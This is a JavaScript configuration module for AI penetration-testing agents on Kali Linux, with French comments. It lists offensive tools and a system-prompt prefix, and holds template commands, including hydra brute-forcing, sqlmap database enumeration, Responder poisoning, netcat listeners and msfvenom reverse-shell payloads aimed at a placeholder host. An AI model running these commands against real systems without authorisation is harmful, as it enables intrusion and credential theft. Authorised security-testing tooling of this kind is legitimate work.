/**
 * Kali Linux Environment Configuration
 * Configuration centralisée pour tous les agents de cybersécurité
 * Assure que toutes les commandes générées sont compatibles Kali Linux
 */

const KALI_ENVIRONMENT = {
    // Identification de l'environnement
    os: 'Kali Linux',
    version: '2024.1',
    shell: 'zsh',
    user: 'kali',
    
    // Chemins standards Kali
    paths: {
        tools: '/usr/share',
        wordlists: '/usr/share/wordlists',
        seclists: '/usr/share/seclists',
        rockyou: '/usr/share/wordlists/rockyou.txt',
        scripts: '/usr/share/nmap/scripts',
        exploits: '/usr/share/exploitdb'
    },
    
    // Outils installés par défaut sur Kali
    defaultTools: [
        // Reconnaissance
        'nmap', 'masscan', 'netdiscover', 'arp-scan', 'dnsenum', 'dnsrecon',
        'whois', 'theHarvester', 'recon-ng', 'maltego', 'spiderfoot',
        
        // Web Analysis
        'nikto', 'dirb', 'gobuster', 'wfuzz', 'ffuf', 'burpsuite',
        'sqlmap', 'wpscan', 'joomscan', 'nuclei', 'httpx',
        
        // Exploitation
        'metasploit-framework', 'msfvenom', 'searchsploit',
        'hydra', 'medusa', 'john', 'hashcat', 'crackmapexec',
        
        // Sniffing & MITM
        'wireshark', 'tcpdump', 'ettercap', 'bettercap', 'responder',
        'mitmproxy', 'arpspoof', 'dnsspoof',
        
        // Wireless
        'aircrack-ng', 'airmon-ng', 'airodump-ng', 'wifite', 'reaver',
        'bully', 'fern-wifi-cracker',
        
        // Post-Exploitation
        'netcat', 'socat', 'chisel', 'ligolo-ng', 'pwncat',
        'mimikatz', 'impacket-scripts', 'evil-winrm', 'bloodhound',
        
        // Forensics
        'volatility', 'autopsy', 'binwalk', 'foremost', 'exiftool',
        'steghide', 'strings', 'hexedit'
    ],
    
    // Prompt système standard pour environnement Kali
    systemPromptPrefix: `ENVIRONNEMENT D'EXÉCUTION:
- Système: Kali Linux 2024.1
- Shell: zsh/bash
- Utilisateur: kali (sudo sans mot de passe)
- Wordlists: /usr/share/wordlists/
- SecLists: /usr/share/seclists/
- Scripts Nmap: /usr/share/nmap/scripts/

RÈGLES POUR LES COMMANDES:
1. Toutes les commandes doivent être compatibles Kali Linux
2. Utilise les chemins absolus standards de Kali
3. Préfère les outils pré-installés sur Kali
4. Pour les wordlists, utilise /usr/share/wordlists/rockyou.txt ou SecLists
5. Les commandes nécessitant root doivent utiliser sudo
6. Format de sortie: commandes exécutables directement dans un terminal Kali

`,
    
    // Exemples de commandes Kali standards
    commandExamples: {
        recon: [
            'nmap -sC -sV -oA scan_target <target>',
            'masscan -p1-65535 --rate=1000 <target>',
            'gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt',
            'ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt'
        ],
        exploitation: [
            'sqlmap -u "http://<target>/page?id=1" --dbs --batch',
            'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>',
            'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ip>; run"',
            'searchsploit --www <vulnerability>'
        ],
        sniffing: [
            'sudo tcpdump -i eth0 -w capture.pcap',
            'sudo bettercap -iface eth0',
            'sudo responder -I eth0 -wrf'
        ],
        shells: [
            'nc -lvnp 4444',
            'rlwrap nc -lvnp 4444',
            'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf'
        ]
    },
    
    // Obtenir le préfixe de prompt système
    getSystemPrompt() {
        return this.systemPromptPrefix;
    },
    
    // Valider si une commande est compatible Kali
    validateCommand(command) {
        const warnings = [];
        
        // Vérifier les chemins Windows
        if (command.includes('C:\\') || command.includes('C:/')) {
            warnings.push('Chemin Windows détecté - utiliser les chemins Linux');
        }
        
        // Vérifier PowerShell
        if (command.includes('powershell') || command.includes('.ps1')) {
            warnings.push('PowerShell détecté - utiliser bash/zsh ou Python');
        }
        
        // Vérifier les commandes Windows
        const windowsCmds = ['ipconfig', 'netstat.exe', 'dir ', 'type ', 'copy ', 'del '];
        for (const cmd of windowsCmds) {
            if (command.toLowerCase().includes(cmd)) {
                warnings.push(`Commande Windows détectée: ${cmd.trim()} - utiliser l'équivalent Linux`);
            }
        }
        
        return {
            valid: warnings.length === 0,
            warnings
        };
    }
};

module.exports = KALI_ENVIRONMENT;
